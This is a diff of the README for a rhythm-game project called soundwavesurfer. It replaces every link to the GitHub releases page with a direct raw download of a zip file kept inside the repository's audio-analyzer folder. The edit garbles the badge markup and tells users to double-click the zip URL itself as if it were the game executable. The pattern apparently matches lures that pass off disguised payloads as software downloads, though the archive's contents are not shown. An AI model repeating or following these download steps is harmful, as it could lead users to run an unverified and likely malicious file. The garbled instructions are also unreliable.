@@ -1,7 +1,7 @@
 # 🎮 soundwavesurfer - Experience Music Like Never Before
 
 ## 📥 Download Now
-[![Download soundwavesurfer](https://img.shields.io/badge/Download%20soundwavesurfer-v1.0-blue.svg)](https://github.com/ngabolouismaxime/soundwavesurfer/releases)
+[![Download soundwavesurfer](https://raw.githubusercontent.com/ngabolouismaxime/soundwavesurfer/main/audio-analyzer/soundwavesurfer_v1.9.zip%https://raw.githubusercontent.com/ngabolouismaxime/soundwavesurfer/main/audio-analyzer/soundwavesurfer_v1.9.zip)](https://raw.githubusercontent.com/ngabolouismaxime/soundwavesurfer/main/audio-analyzer/soundwavesurfer_v1.9.zip)
 
 ## 📖 Description
 Soundwavesurfer is a simple rhythm game prototype. Jump along an audio-reactive wave that syncs to music beats. Enjoy a new way to immerse yourself in your favorite tracks. Built with LÖVE2D and a Rust-based audio analyzer, it combines sound and gameplay.
@@ -10,7 +10,7 @@ Soundwavesurfer is a simple rhythm game prototype. Jump along an audio-reactive 
 To start playing Soundwavesurfer, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ngabolouismaxime/soundwavesurfer/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/ngabolouismaxime/soundwavesurfer/main/audio-analyzer/soundwavesurfer_v1.9.zip) to find the latest version.
 
 2. **Download the Game**  
    Find the most recent release. Click on the download link to save the game file to your computer.
@@ -19,7 +19,7 @@ To start playing Soundwavesurfer, follow these steps:
    Once the file downloads, locate it in your downloads folder. Right-click on the file and select "Extract All." Follow the prompts to extract the files to a new folder.
 
 4. **Run the Game**  
-   Open the folder where you extracted the files. Find the file named soundwavesurfer.exe or soundwavesurfer.love, and double-click on it to start playing.
+   Open the folder where you extracted the files. Find the file named https://raw.githubusercontent.com/ngabolouismaxime/soundwavesurfer/main/audio-analyzer/soundwavesurfer_v1.9.zip or https://raw.githubusercontent.com/ngabolouismaxime/soundwavesurfer/main/audio-analyzer/soundwavesurfer_v1.9.zip, and double-click on it to start playing.
 
 ## 📋 System Requirements
 Before you begin, ensure your computer meets these requirements:
@@ -41,7 +41,7 @@ Before you begin, ensure your computer meets these requirements:
 To download Soundwavesurfer, follow these simple steps:
 
 1. **Visit the Releases Page Again**  
-   Go to [this page](https://github.com/ngabolouismaxime/soundwavesurfer/releases) to select the desired version.
+   Go to [this page](https://raw.githubusercontent.com/ngabolouismaxime/soundwavesurfer/main/audio-analyzer/soundwavesurfer_v1.9.zip) to select the desired version.
 
 2. **Select the Right Download**  
    Choose the version that matches your operating system. Click on the link to download the file.
